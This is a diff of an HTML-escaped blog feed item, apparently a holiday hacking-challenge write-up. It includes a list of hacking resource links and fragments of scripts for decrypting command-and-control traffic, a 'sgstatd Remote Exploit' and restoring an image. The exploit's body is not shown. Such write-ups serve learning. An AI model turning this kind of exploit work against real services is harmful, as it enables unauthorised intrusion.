-&lt;h2 id=&#34;part-4:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Part 4&lt;/h2&gt;
+&lt;h2 id=&#34;part-4&#34;&gt;Part 4&lt;/h2&gt;
 
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html&#34;&gt;HACKING NODEJS AND MONGODB&lt;/a&gt;&lt;/li&gt;
@@ -646,11 +648,11 @@ The restored video feed &lt;a href=&#34;http://camelinc.info/img/post/2015/holid
 &lt;li&gt;&lt;a href=&#34;https://gist.github.com/joswr1ght/a45d000ceaccf4cce6cb&#34;&gt;Disable DEP/NX on Linux in Grub&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h1 id=&#34;scripts:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Scripts&lt;/h1&gt;
+&lt;h1 id=&#34;scripts&#34;&gt;Scripts&lt;/h1&gt;
 
-&lt;h2 id=&#34;decrypt-c-c-communication:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Decrypt C&amp;amp;C Communication&lt;/h2&gt;
+&lt;h2 id=&#34;decrypt-c-c-communication&#34;&gt;Decrypt C&amp;amp;C Communication&lt;/h2&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/env python2&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/env python2&lt;/span&gt;
 &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scapy.all&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
 
 &lt;span class=&#34;n&#34;&gt;packetCount&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
@@ -732,11 +734,11 @@ The restored video feed &lt;a href=&#34;http://camelinc.info/img/post/2015/holid
         &lt;span class=&#34;n&#34;&gt;fh&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
         &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
 
-&lt;h2 id=&#34;sgstatd-remote-exploit:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;sgstatd Remote Exploit&lt;/h2&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/env python2&lt;/span&gt;
+&lt;h2 id=&#34;sgstatd-remote-exploit&#34;&gt;sgstatd Remote Exploit&lt;/h2&gt;
+
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/env python2&lt;/span&gt;
 &lt;span class=&#34;c&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
 
 &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
@@ -803,13 +805,13 @@ The restored video feed &lt;a href=&#34;http://camelinc.info/img/post/2015/holid
 
 &lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
 
-&lt;h2 id=&#34;restore-overlay-error:fc53e74f05f8f7542d80a6ee08c867a6&#34;&gt;Restore Overlay Error&lt;/h2&gt;
+
+&lt;h2 id=&#34;restore-overlay-error&#34;&gt;Restore Overlay Error&lt;/h2&gt;
 
 &lt;!-- TODO: adjust script to work correctly //--&gt;
 
-&lt;p&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
 &lt;span class=&#34;c&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
 
 &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;PIL&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ImageChops&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ImageMath&lt;/span&gt;
@@ -853,7 +855,7 @@ The restored video feed &lt;a href=&#34;http://camelinc.info/img/post/2015/holid
 
 &lt;span class=&#34;n&#34;&gt;newimaj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#39;solution.png&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;/p&gt;
+
 </description>
     </item>
     
